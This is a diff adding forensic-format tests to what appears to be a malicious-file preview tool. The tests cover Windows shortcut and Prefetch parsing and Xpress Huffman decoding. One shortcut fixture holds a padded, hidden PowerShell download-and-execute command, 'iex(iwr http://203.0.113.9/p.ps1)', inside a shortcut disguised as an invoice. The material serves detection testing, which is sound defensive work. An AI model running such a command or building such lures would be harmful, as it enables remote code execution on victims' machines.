@@ -25,6 +25,11 @@
  *  10. text (42f): a leaked config's keys found and masked, a dropper read
  *      line by line (its -EncodedCommand decoded), shells; JSON nesting and
  *      XML entities refused before any parser; encodings
+ *  13. forensic formats (42i): a shortcut and a Prefetch file built at run
+ *      time (tests/lib/forensic.mjs; LnkParse3 and dissect read them the
+ *      same) — the lure's interpreter, padded arguments, icon, window,
+ *      tracker and MAC, appended bytes; the Prefetch's runs, path, files,
+ *      volume; Xpress Huffman round trips over blocks; cut short, said
  *  12. macros (42h): MS-OVBA's own example vectors decompressed; DPB values
  *      Excel wrote decrypted; projects built at run time (tests/lib/vba.mjs)
  *      in .docm, .doc, .xls, .ppt and OpenDocument Basic read the same way:
@@ -88,6 +93,11 @@ import { pcodeStrings, readVba } from "../../web/src/preview/vba/project.ts";
 import { macrosInOle, macrosInPpt, macrosInZip } from "../../web/src/preview/vba/macros.ts";
 import { triage } from "../../web/src/preview/vba/triage.ts";
 import { macroFacts, withMacros } from "../../web/src/preview/facts/vba.ts";
+import { parseLnk } from "../../web/src/preview/forensic/lnk.ts";
+import { parsePrefetch } from "../../web/src/preview/forensic/prefetch.ts";
+import { xpressHuffman } from "../../web/src/preview/forensic/xpress.ts";
+import { lnkFacts, prefetchFacts } from "../../web/src/preview/facts/forensic.ts";
+import { buildLnk, buildPrefetch, xpressCompress } from "../lib/forensic.mjs";
 import { compress, encryptValue, hostileProject, oleWithVba, odfWithBasic, pcode, pptWithVba, vbaProject, withVba } from "../lib/vba.mjs";
 
 const fixture = (name: string) => new Uint8Array(readFileSync(new URL(`../fixtures/preview/${name}`, import.meta.url)));
@@ -754,5 +764,58 @@ assert.deepEqual(pcodeStrings(Uint8Array.from([0, 0, 5, 0, ...new TextEncoder().
 assert.equal(said(withMacros([{ level: "info", text: "A document" }, { level: "warn", text: "Contains macros (a VBA project) — none of it was run" }], honest.modules.length ? { kind: "a VBA project", modules: honest.modules, locked: false, signed: false, warnings: [] } : null)).split("\n")[1], "Contains macros — a VBA project: 1 module (Module1) — none of it was run; the Macros button shows the source");
 // A module opened as text keeps its triage.
 assert.match(tf("Helper.bas", 'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" () As LongPtr\nSub AutoOpen()\nEnd Sub'), /Line 2: AutoOpen runs by itself \(on open\)[\s\S]*Calls Windows directly: VirtualAlloc \(kernel32, line 1\)/);
+
+// ── 13. Forensic formats (42i) ───────────────────────────────────────
+const lure = buildLnk({
+	target: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+	args: `${" ".repeat(300)}-w hidden -nop -c iex(iwr http://203.0.113.9/p.ps1)`,
+	workingDir: "%TEMP%", icon: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", iconIndex: 11, name: "Invoice PDF", show: 7,
+	times: { created: new Date("2026-03-01T10:00:00Z"), accessed: new Date("2026-03-02T10:00:00Z"), written: new Date("2026-03-01T10:00:00Z") }, size: 450560,
+	volume: { type: 3, serial: 0x4c3a1f2e, label: "OS" }, envTarget: "%windir%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+	tracker: { machine: "desktop-gor4ni", mac: "00:0c:29:ab:cd:ef", time: new Date("2026-02-28T09:30:00Z") },
+	appended: Uint8Array.from([0x50, 0x4b, 3, 4, 1, 2, 3, 4]),
+});
+const lk = parseLnk(lure)!;
+assert.equal(lk.target, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "from LinkInfo");
+assert.equal(lk.idListPath, lk.target, "…and the shell items say the same, long names and all");
+assert.deepEqual([lk.window, lk.iconIndex, lk.size, lk.volume, lk.appended], ["minimized", 11, 450560, { type: "fixed", serial: "4C3A-1F2E", label: "OS" }, { offset: lure.length - 8, size: 8 }]);
+assert.deepEqual([lk.tracker?.machine, lk.tracker?.mac, lk.tracker?.time?.toISOString()], ["desktop-gor4ni", "00:0c:29:ab:cd:ef", "2026-02-28T09:30:00.000Z"], "the machine, and the MAC and time inside its version-1 object ID");
+assert.equal(lk.times.accessed?.toISOString(), "2026-03-02T10:00:00.000Z");
+const lf = said(lnkFacts(lk, "Invoice.pdf.lnk"));
+for (const want of [
+	/^A Windows shortcut → “C:\\Windows\\System32\\WindowsPowerShell\\v1\.0\\powershell\.exe” with arguments/m,
+	/Runs powershell\.exe — a program that runs other code — with: “-w hidden -nop -c iex/,
+	/351 characters, the first 300 blank — Windows' Properties box shows 260/,
+	/Its arguments: it downloads and runs code \(PowerShell\)/,
+	/Opens minimized/,
+	/Shows the icon of “.*msedge\.exe” \(index 11\) while it runs powershell\.exe — dressed as something else/,
+	/Carries 8 bytes after its end/,
+	/Made on the machine “desktop-gor4ni” \(network card 00:0c:29:ab:cd:ef — VMware's: a virtual machine\)/,
+	/on a fixed disk, serial 4C3A-1F2E, label “OS”/,
+]) assert.match(lf, want);
+const share = parseLnk(buildLnk({ target: "\\\\files.example\\drop\\setup.exe", show: 1 }))!;
+assert.deepEqual([share.target, share.share?.net], ["\\\\files.example\\drop\\setup.exe", "\\\\files.example\\drop"]);
+assert.match(said(lnkFacts(share, "setup.lnk")), /Points at a network share[\s\S]*No target times or size — made by a tool/);
+assert.match(said(lnkFacts(lk, "invoice.pdf")), /Named “invoice\.pdf”, but it is a shortcut/);
+for (const n of [76, 100, 300, 900]) assert.ok(parseLnk(lure.subarray(0, n))!.warnings.length || n >= lure.length, `cut at ${n}: said`);
+
+// Xpress Huffman: our decoder against our writer (checked against dissect's), across blocks and long matches.
+for (const data of [new Uint8Array(0), new TextEncoder().encode("abcabcabc".repeat(50)), Uint8Array.from({ length: 150_000 }, (_, i) => (i % 97 < 60 ? 65 + (i % 7) : (i * 2654435761) >>> 24)), new Uint8Array(70_000).fill(7)]) {
+	assert.deepEqual(xpressHuffman(xpressCompress(data), data.length), data, `${data.length} bytes`);
+}
+assert.equal(xpressHuffman(new Uint8Array(10), 100), null, "too short for a table");
+const pfBytes = buildPrefetch({
+	exe: "RCLONE.EXE", hash: 0x1a2b3c4d, runCount: 3,
+	runs: [new Date("2026-04-02T03:04:05Z"), new Date("2026-04-01T22:00:00Z"), new Date("2026-03-31T21:00:00Z")],
+	files: ["\\VOLUME{01d9a1b2c3d4e5f6-4c3a1f2e}\\WINDOWS\\SYSTEM32\\NTDLL.DLL", "\\VOLUME{01d9a1b2c3d4e5f6-4c3a1f2e}\\USERS\\RIN\\APPDATA\\LOCAL\\TEMP\\RCLONE.EXE", "\\VOLUME{01d9a1b2c3d4e5f6-4c3a1f2e}\\USERS\\RIN\\APPDATA\\LOCAL\\TEMP\\RCLONE.CONF"],
+	volume: { device: "\\VOLUME{01d9a1b2c3d4e5f6-4c3a1f2e}", serial: 0x4c3a1f2e, created: new Date("2025-11-20T08:00:00Z"), dirs: ["\\VOLUME{01d9a1b2c3d4e5f6-4c3a1f2e}\\USERS"] },
+});
+const pp = parsePrefetch(pfBytes)!;
+assert.deepEqual([pp.version, pp.compressed, pp.exe, pp.hash, pp.runCount, pp.runs.length, pp.files.length, pp.volumes[0]?.serial, pp.volumes[0]?.dirs], [30, true, "RCLONE.EXE", "1A2B3C4D", 3, 3, 3, "4C3A-1F2E", ["\\VOLUME{01d9a1b2c3d4e5f6-4c3a1f2e}\\USERS"]]);
+assert.deepEqual(parsePrefetch(buildPrefetch({ exe: "A.EXE", hash: 1, runCount: 1, runs: [], files: [], volume: { device: "\\V", serial: 1, created: null, dirs: [] }, compressed: false }))!.compressed, false, "uncompressed (Windows 8.1 and before) read the same");
+const pff = said(prefetchFacts(pp, "RCLONE.EXE-1A2B3C4D.pf"));
+for (const want of [/A Windows Prefetch file \(Windows 10\/11, compressed\): RCLONE\.EXE ran 3 times/, /Last ran 2026-04-02 03:04:05 UTC; before that 2026-04-01 22:00:00, 2026-03-31 21:00:00/, /RCLONE\.EXE copies files to cloud storage/, /It ran from .*\\TEMP\\RCLONE\.EXE” — a folder any user can write to/, /touched 1 file in folders any user can write to: “\\USERS\\RIN\\APPDATA\\LOCAL\\TEMP\\RCLONE\.CONF”/]) assert.match(pff, want);
+assert.match(said(prefetchFacts(pp, "SVCHOST.EXE-1A2B3C4D.pf")), /Named for SVCHOST\.EXE \(1A2B3C4D\), but its header says RCLONE\.EXE/, "a renamed Prefetch file");
+assert.equal(parsePrefetch(pfBytes.subarray(0, 40)), null, "cut inside its compressed data: nothing, not a crash");
 
 console.log("ok  preview-facts: ZIP bombs refused (a lying part, an over-claiming directory); every planted trick in the hostile Word, Excel, PowerPoint, 한글, .doc and RTF fixtures named — and the honest reports warn of nothing; the phishing .eml's and .msg's every trick named, the forged Authentication-Results not believed, the hop the sender could not write found, a forwarded message parsed in turn, attachments judged by name and bytes; pictures sniffed by their bytes, a bomb's size read before decoding, what follows a picture's end named, a RAW file's own previews found, GPS, the camera and the editing read, a thumbnail that no longer matches named; archives read by our ZIP, ALZ and EGG readers and by 7-Zip (7z, RAR 5, TAR in three compressions, CAB, ISO, ARJ, LZH, zstd), CP949 names, ZipCrypto and AES opened and wrong passwords refused, liars and bombs stopped, AZO listed and not opened, and every lure's trick named; text: secrets found and masked (placeholders not), a dropper's every line named and its -EncodedCommand decoded, a reverse shell, a web shell, encoded and obfuscated scripts; JSON nesting refused before parsing, JSON Lines counted, XML entities and outside DTDs named and never parsed; Korean and UTF-16 text decoded; programs: mingw, gcc and clang builds read as pefile, readelf and llvm-otool read them (imphash, version, exports, ad hoc signature), the hostile PE's injection, packer, overlay, forged signature and ransom strings named, cut-short headers said and never thrown; macros: MS-OVBA's own vectors, Excel's own DPB values, projects in .docm, .xlsm, .pptm, .doc, .xls, .ppt and OpenDocument Basic read alike — auto-run, Shell, the shellcode Declares, stomping, hidden modules, a locked project, a form's text");
